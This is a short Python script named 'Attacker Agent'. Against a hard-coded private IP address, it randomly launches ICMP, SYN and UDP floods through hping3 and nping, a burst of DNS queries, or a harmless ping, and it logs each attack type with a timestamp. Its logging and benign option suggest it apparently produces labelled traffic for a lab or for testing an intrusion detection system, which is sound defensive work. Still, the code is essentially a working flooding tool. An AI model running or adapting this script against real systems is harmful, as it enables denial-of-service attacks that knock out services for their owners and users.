import subprocess
import random
import time
from datetime import datetime

TARGET_IP = "192.168.0.105"

def log_event(attack_type):
    with open("attacker_log.txt", "a") as f:
        f.write(f"{datetime.now()} | ATTACK: {attack_type}\n")

def icmp_flood():
    log_event("icmp_flood")
    subprocess.Popen(["hping3", "-1", TARGET_IP, "-i", "u1000", "-c", "100"])

def syn_flood():
    log_event("syn_flood")
    subprocess.Popen(["hping3", "-S", "-p", "80", "--flood", TARGET_IP])

def udp_flood():
    log_event("udp_flood")
    subprocess.Popen(["nping", "--udp", "-c", "1000", "--rate", "500", TARGET_IP])

def dns_spam():
    log_event("dns_spam")
    for _ in range(20):
        subprocess.Popen(["dig", "@"+TARGET_IP, "example.com"])

def benign_ping():
    log_event("benign_ping")
    subprocess.Popen(["ping", "-c", "5", TARGET_IP])

ATTACKS = [icmp_flood, syn_flood, udp_flood, dns_spam, benign_ping]

print("[🔥] Attacker Agent Started...")
try:
    while True:
        attack = random.choice(ATTACKS)
        attack()
        time.sleep(20)
except KeyboardInterrupt:
    print("\n[✔️] Stopped Attacker Agent.")
